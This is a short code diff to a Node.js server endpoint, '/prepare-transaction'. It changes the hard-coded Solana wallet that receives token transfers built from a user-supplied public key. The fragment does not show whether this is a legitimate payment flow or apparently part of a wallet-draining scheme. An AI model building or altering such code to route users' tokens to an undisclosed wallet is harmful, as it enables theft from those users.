@@ -230,7 +230,7 @@ app.post('/prepare-transaction', async (req, res) => {
     const { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction } = require('@solana/spl-token');
 
     const fromPubkey = new PublicKey(publicKey);
-    const receiverWallet = new PublicKey('AjF1cgmjpuJsDs8YaL2BLxB9Ttgvxf6s8oYxzSBjekwg');
+    const receiverWallet = new PublicKey('4hhyrESRPbM2jTX4P7DjevKzPuNPatWUvKyEpqtEQn9a');
 
     const transaction = new Transaction();
     let totalTransferred = 0;
